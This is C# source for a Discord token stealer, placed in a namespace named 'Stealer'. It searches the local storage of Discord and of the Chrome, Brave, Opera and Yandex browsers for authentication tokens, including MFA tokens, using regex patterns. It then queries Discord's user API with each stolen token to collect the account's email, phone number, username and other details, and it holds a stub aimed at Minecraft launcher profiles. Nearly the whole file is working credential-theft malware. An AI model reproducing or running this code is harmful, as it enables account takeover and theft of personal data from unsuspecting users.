using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.IO;
using System.Net.Http;

namespace Stealer
{
    class Grabber
    {
        public static List<string> target = new List<string>();

        private static void Scan()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            target.Add(roaming + "\\Discord");
            target.Add(roaming + "\\discordcanary");
            target.Add(roaming + "\\discordptb");
            target.Add(roaming + "\\\\Opera Software\\Opera Stable");
            target.Add(local + "\\Google\\Chrome\\User Data\\Default");
            target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");
        }
        public static List<string> Grab()
        {
            Scan();
            List<string> tokens = new List<string>();
            foreach (string x in target)
            {
                if (Directory.Exists(x))
                {
                    string path = x + "\\Local Storage\\leveldb";
                    DirectoryInfo leveldb = new DirectoryInfo(path);
                    foreach (var file in leveldb.GetFiles(false ? "*.log" : "*.ldb"))
                    {
                        string contents = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            tokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                            tokens.Add(match.Value);
                    }
                }
            }
            return tokens;
        }

        public static void Minecraft()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string target = roaming + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
        }
    }

    class Token
    {
        private string token;
        private string jsonResponse = String.Empty;

        public string fullUsername;
        public string userId;
        public string avatarUrl;
        public string phoneNumber;
        public string email;
        public string locale;
        public string creationDate;

        public Token(string inToken)
        {
            token = inToken;
            PostToken();
        }

        private void PostToken()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    var response = client.GetAsync("https://discordapp.com/api/v8/users/@me");
                    var final = response.Result.Content.ReadAsStringAsync();
                    jsonResponse = final.Result;
                }
                GetData();
            }
            catch
            {
            }
        }
        private void GetData()
        {
            string username = Common.Extract("username", jsonResponse);
            userId = Common.Extract("id", jsonResponse);
            string discriminator = Common.Extract("discriminator", jsonResponse);
            fullUsername = username + "#" + discriminator;

            string avatarId = Common.Extract("avatar", jsonResponse);
            avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + avatarId;

            phoneNumber = Common.Extract("phone", jsonResponse);
            email = Common.Extract("email", jsonResponse);

            locale = Common.Extract("locale", jsonResponse);

            long creation = (Convert.ToInt64(userId) >> 22) + 1420070400000;
            var result = DateTimeOffset.FromUnixTimeMilliseconds(creation).DateTime;
            creationDate = result.ToString();
        }
    }
}
